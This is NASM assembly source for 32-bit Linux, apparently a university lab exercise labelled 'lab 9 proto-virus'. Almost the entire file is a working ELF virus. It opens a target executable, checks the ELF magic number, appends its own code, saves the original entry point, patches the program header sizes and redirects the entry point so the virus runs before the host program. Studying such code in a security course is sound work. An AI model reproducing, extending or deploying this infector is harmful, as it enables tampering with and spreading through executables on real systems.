%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define ELFHDR_SIZE 52

%define FD [ebp-4]
%define FILE_SIZE [ebp-8]
%define ELF_HEADER ebp-8-ELFHDR_SIZE
%define PROGRAM_HEADER ELF_HEADER-PHDR_size
%define VIRUS_SIZE [PROGRAM_HEADER-4]

	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

; You code for this lab goes here
; Print:
	call get_my_loc
	add ecx, infected_msg ; - next_i
	write 1, ecx, 16

; open file, file descriptor returns to eax		
	call get_my_loc
	add ecx, FileName ;- next_i
	mov ebx, ecx
	open ebx, RDWR, 07777
	cmp eax, 0
	jl errorVirusOpen;errorExit
	mov FD, eax				; save fd

; copy ELF header into memory (on the stack):
	lea ebx, [ELF_HEADER] ; ELF Heaedr
	read FD, ebx, ELFHDR_SIZE

; Check Magic number
	cmp byte [ELF_HEADER], 0x7f
    jne errorExit
    cmp byte [ELF_HEADER+1], 'E'
    jne errorExit
    cmp byte [ELF_HEADER+2], 'L'
    jne errorExit
    cmp byte [ELF_HEADER+3], 'F'
    jne errorExit

; infect file
	lseek FD, 0, SEEK_END
	mov FILE_SIZE, eax
	call get_my_loc
	add ecx, _start
	mov ebx, ecx
	call get_my_loc
	add ecx, virus_end
	sub ecx, ebx
	mov VIRUS_SIZE, ecx
	write FD, ebx, ecx

; Save the original Entry point
	lseek FD, -4, SEEK_END
	lea ebx, [ELF_HEADER+ENTRY]
	write FD, ebx, 4

; Load the second program header
	mov ebx, [ELF_HEADER+PHDR_start] ; Address of first entry
	add ebx, PHDR_size ; Address of second entry
	lseek FD, ebx, SEEK_SET
	lea ebx, [PROGRAM_HEADER]
	read FD, ebx, PHDR_size

; Update Entry Point in memory
	mov eax, FILE_SIZE;
	sub eax, [PROGRAM_HEADER+PHDR_offset]
	add eax, [PROGRAM_HEADER+PHDR_vaddr]
	mov [ELF_HEADER+ENTRY], eax

; Update the size of the second program header in memory
	mov ebx, FILE_SIZE
	add ebx, VIRUS_SIZE
	sub ebx, [PROGRAM_HEADER+PHDR_offset]
	mov [PROGRAM_HEADER+PHDR_memsize], ebx
	mov [PROGRAM_HEADER+PHDR_filesize], ebx

; Update the second program header file in the file
	mov ebx, [ELF_HEADER+PHDR_start] ; Address of first entry
	add ebx, PHDR_size ; Address of second entry
	lseek FD, ebx, SEEK_SET
	lea ebx, [PROGRAM_HEADER]
	write FD, ebx, PHDR_size

; Save ELF header to file
	lseek FD, 0, SEEK_SET
	lea ebx, [ELF_HEADER]
	write FD, ebx, ELFHDR_SIZE

; Close the file
	close FD

; Perform exit / original code
	call get_my_loc
    add ecx, PreviousEntryPoint ; - next_i
    jmp [ecx]

VirusExit:
    exit 0            	; Termination if all is OK and no previous code to jump to
	
errorVirusOpen:
	call get_my_loc
	add ecx, PreviousEntryPoint; - next_i
	cmp [ecx], dword VirusExit
	je errorExit
	jmp [ecx]
errorExit:
	call get_my_loc
	add ecx, error_msg; - next_i
	write 1, ecx, 20
	exit 1

get_my_loc:
	call next_i
next_i:
	pop ecx
	sub ecx, next_i
	ret
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
infected_msg: db "This is a virus", 10, 0
error_msg: db "Failed to open file", 10, 0
	
PreviousEntryPoint: dd VirusExit
virus_end:
